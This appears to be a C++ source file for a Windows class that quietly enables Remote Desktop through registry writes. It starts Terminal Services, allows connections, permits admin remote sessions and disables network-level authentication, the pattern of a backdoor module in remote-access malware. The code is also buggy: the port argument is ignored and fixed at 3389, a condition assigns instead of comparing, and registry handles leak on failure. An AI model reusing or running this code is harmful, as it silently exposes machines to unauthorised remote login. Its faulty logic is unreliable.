#include "OpenRdp.h"

OpenRdp* OpenRdp::instance = NULL;

BOOL OpenRdp::RegHelper::SetStringValue(HKEY hRoot, const char* szSubKey, const char* szValueName, const char* szValue) {
	HKEY key = NULL;
	long let;
	let = RegCreateKeyEx(hRoot, szSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	if (let = RegSetValueEx(key, szValueName, 0, REG_SZ, (BYTE*)szValue, strlen(szValue))) return false;
	RegCloseKey(key);
	return true;
}

BOOL OpenRdp::RegHelper::SetDwordValue(HKEY hRoot, const char* szSubKey, const char* szValueName, DWORD szValue) {
	HKEY key = NULL;
	long let;
	let = RegCreateKeyEx(hRoot, szSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	if (let = RegSetValueEx(key, szValueName, 0, REG_DWORD, (BYTE*)&szValue, sizeof(DWORD))) return false;
	RegCloseKey(key);
	return true;
}

BOOL OpenRdp::changePort(DWORD port) {
	regHelper.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp", "PortNumber", 0x00000d3d);
	regHelper.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", "PortNumber", 0x00000d3d);
	return regHelper.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp", "PortNumber", 0x00000d3d);
}

BOOL OpenRdp::permitRootLogin(BOOL yes) {
	if (yes) {
		return regHelper.SetDwordValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "EnableAdminTSRemote", 0x00000001);
	}
	else {
		return regHelper.SetDwordValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "EnableAdminTSRemote", 0x00000000);
	}
}

BOOL OpenRdp::openRdp(DWORD port, BOOL permitRootLogin) {
	regHelper.SetStringValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache", "Enabled", "0");
	OpenRdp::permitRootLogin(permitRootLogin);
	regHelper.SetStringValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "ShutdownWithoutLogon", "0");
	regHelper.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "TSEnabled", 0x00000001);
	regHelper.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermDD", "Start", 0x00000002);
	regHelper.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermService", "Start", 0x00000002);
	regHelper.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", 0x00000001);
	OpenRdp::changePort(port);
	regHelper.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", 0x00000000);
	regHelper.SetStringValue(HKEY_USERS, ".DEFAULT\\Keyboard Layout\\Toggle", "Hotkey", "2");
	return regHelper.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", "UserAuthentication", 0x00000000);
}

BOOL OpenRdp::openRdp() {
	return this->openRdp(3389, 1);
}

OpenRdp* OpenRdp::getInstance() {
	if (instance == NULL) {
		instance = new OpenRdp();
	}
	return instance;
}

OpenRdp::Deletor::~Deletor() {
	if (OpenRdp::instance != NULL) {
		delete OpenRdp::instance;
	}
}
